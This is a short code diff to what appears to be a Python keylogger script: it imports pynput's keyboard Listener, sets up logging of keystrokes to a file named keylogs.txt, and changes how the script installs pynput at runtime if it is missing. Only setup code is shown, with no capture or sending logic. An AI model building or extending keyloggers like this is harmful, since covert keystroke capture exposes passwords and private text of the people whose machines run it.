@@ -22,11 +22,15 @@ print("""
 from pynput.keyboard import Key, Listener
 import logging
 import subprocess
+import sys
 
-#installing packages
-def install(pynput):
-        subprocess.call(['pip', 'install', pynput])
-	
+try:
+    import pynput
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", 'pynput'])
+finally:
+    import pynput
+
 log_dir = ""
 
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
